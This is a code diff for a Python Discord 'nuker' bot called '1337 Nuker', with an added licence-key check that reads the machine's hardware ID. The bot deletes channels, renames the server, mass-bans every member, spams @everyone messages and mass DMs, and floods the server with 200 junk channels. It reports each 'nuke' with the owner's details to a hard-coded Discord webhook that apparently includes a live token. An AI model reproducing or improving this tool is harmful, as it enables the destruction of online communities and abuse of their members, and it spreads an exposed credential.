@@ -1,3 +1,30 @@
+# Simple Authentication System
+
+import requests, time, os, ctypes, subprocess
+from colorama import Fore as F
+
+os.system('cls')
+
+hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+system_name = os.getenv('HOSTNAME')
+user_name = os.getenv('USERNAME')
+
+ctypes.windll.kernel32.SetConsoleTitleW("1337 Auth | " + hwid)
+key1 = input(f"Please enter your key: {F.CYAN}")
+r = requests.get("https://pastebin.com/bmyhaeYj")
+if key1 in r.text:
+    print(f"{F.GREEN}Access granted. Welcome to 1337 Nuker!{F.RESET}")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Welcome to 1337 official nuker! Logged in as {user_name}")
+    time.sleep(2)
+    os.system('cls')
+else:
+    print(f"{F.RED}Invalid Key! Fuck off dweeb.{F.RESET}")
+    print(f"Please contact {F.BLUE}𝖃𝖒𝖆𝖘 $𝖆𝖎𝖛#1337{F.RESET} to get a key.")
+    time.sleep(5)
+    quit()
+
+# Bot Start Point
+
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg"
 spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by 1337 | We are in the shadows**"]
 channel_names = ["🤫", "1337", "beamed"]
@@ -6,7 +33,7 @@ webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫"]
 import discord, random, aiohttp, asyncio, json, os, threading
 from discord import Webhook, AsyncWebhookAdapter
 from discord.ext import commands
-from colorama import Fore as C
+from colorama import Fore as C, Style as S
 from time import sleep
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -24,9 +51,9 @@ bot.remove_command("help")
 async def status_task():
     while True:
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name=f"Protecting Servers"))
-        await asyncio.sleep(15)
+        await asyncio.sleep(20)
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="SIKE, beamed by 1337"))
-        await asyncio.sleep(120)
+        await asyncio.sleep(60)
 
 async def nuke(guild):
   print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
@@ -42,16 +69,16 @@ async def nuke(guild):
       print(f"{C.GREEN}[+] [Channel Deletion] {C.WHITE}{channel.name}")
     except:
       print(f"{C.RED}[-] [Channel Deletion] {C.WHITE}{channel.name}{C.RESET}")
-  await guild.edit(name=f"1337 ~ {guild.name}")
+  await guild.edit(name=f"1337 wizzed {guild.name}")
   nukedwebhook = ["https://discord.com/api/webhooks/784536463588327444/5hE0jrlRbkQCXeobAJFjfO1HOzhkMkW6KNIAw4xUMQXaIGk-rDnyfQ-Sd5flLgmI7mbN"]
   webhook = DiscordWebhook(url=nukedwebhook)
   log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
   log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
   log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
-  log.add_embed_field(name = "Members Banned", value = f"{guild.bans()}", inline = False)
+  log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
-  for i in range(100):
+  for i in range(200):
     await guild.create_text_channel(random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
@@ -59,7 +86,7 @@ async def nuke(guild):
 
 @bot.event
 async def on_ready():
-  print("Starting Status..")
+  print("Starting Status..\n")
   loop = asyncio.get_event_loop()
   loop.create_task(status_task())
   await asyncio.sleep(1)
@@ -138,7 +165,7 @@ async def dmall(ctx):
 async def massban(ctx):
   for user in list(ctx.guild.members):
     try:
-      await user.ban(reason="Wizzed by 1337")
+      await user.ban()
       print(f"{C.GREEN}[+] [Mass Ban] {user.name} in {ctx.guild.name}")
     except:
         print(f"{C.RED}[-] [Mass Ban] {user.name} in {ctx.guild.name}")
@@ -206,12 +233,12 @@ def _input():
             inp = input(f"{C.WHITE}[{C.RED}1337 Nuker{C.WHITE}] ")
             if inp == "help":
                 print(f'''{C.GREEN}
-        prefix  :: {C.RED}Shows the Bot prefix.                      :: {C.MAGENTA}{BOT_PREFIX}{C.GREEN}
-        close   :: {C.RED}Closes the bot & cmd window.                   :: {C.MAGENTA}close{C.GREEN}
-        ping    :: {C.RED}Shows the bots response time to Discord.  :: {C.MAGENTA}{round(bot.ws.latency * 1000)}{C.GREEN}
-        guilds  :: {C.RED}Shows the amount of guilds your bot's in.         :: {C.MAGENTA}{len(bot.guilds)}{C.GREEN}
-	id      :: {C.RED}Shows your BOT id.                            :: {C.MAGENTA}{bot.user.id}{C.GREEN}
-	restart :: {C.RED}Restarts the Bot.                          :: {C.MAGENTA}restart{C.GREEN}
+        prefix  :: {C.RED}Shows the Bot prefix.                            :: {C.MAGENTA}{BOT_PREFIX}{C.GREEN}
+        close   :: {C.RED}Closes the bot & cmd window.                     :: {C.MAGENTA}close{C.GREEN}
+        ping    :: {C.RED}Shows the bots response time to Discord.         :: {C.MAGENTA}{round(bot.ws.latency * 1000)}{C.GREEN}
+        guilds  :: {C.RED}Shows the amount of guilds your bot's in.        :: {C.MAGENTA}{len(bot.guilds)}{C.GREEN}
+	id      :: {C.RED}Shows your BOT id.                               :: {C.MAGENTA}{bot.user.id}{C.GREEN}
+	restart :: {C.RED}Restarts the Bot. (only works in cmd prompt)     :: {C.MAGENTA}restart{C.GREEN}
         ''')
             if inp == "close":
                 print("Closing...")
